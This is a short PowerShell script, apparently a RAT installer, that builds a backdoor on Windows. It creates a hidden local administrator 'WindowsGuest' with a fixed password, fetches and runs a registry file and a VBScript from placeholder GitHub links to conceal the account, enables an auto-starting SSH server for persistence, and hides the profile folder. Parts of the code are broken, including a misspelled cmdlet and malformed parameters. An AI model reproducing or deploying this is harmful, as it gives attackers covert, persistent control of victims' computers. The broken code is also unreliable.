
# created by : RAT

# random string for directory name
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin
function create_account {
    [CmdletBinding()]
    param (
        [string] $usertag,
        [securestring] $passkey
    )
    begin {
    }
    process {
        New-LocaklUser "$usertag" -passkey $passkey -FullName "$usertag" -Description "Temporary local admin" Write-Verbose "$usertag local user craeted" Add-LocalGroupMember -Group "Administrators" -Member "$usertag" Write-Verbose "$usertag added to local administrators group"
    }
    end {

    }
}

# variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# create admin user
$usertag = "WindowsGuest"
$passkey = (ConvertTo-SecureString "P@sskey1234" -AsPlainText -Force)
create_account -usertag $usertag -passkey $passkey

# goto temp, make working directory
mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri GitHub Link of Registry.reg -OutFile "Registry.reg"

# visual basic script to register the registry
Invoke-WebRequest -Uri GitHub Link of confirm.vbs -OutFile "confirm.vbs"

#enabling persistence ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# install the registry
./Registry.reg; ./confirm.vbs

# hide WindowsGuest user
cd C:\Users
attrib +h +s +r WindowsGuest

# self delete
cd $initial_dir
# del installer.ps1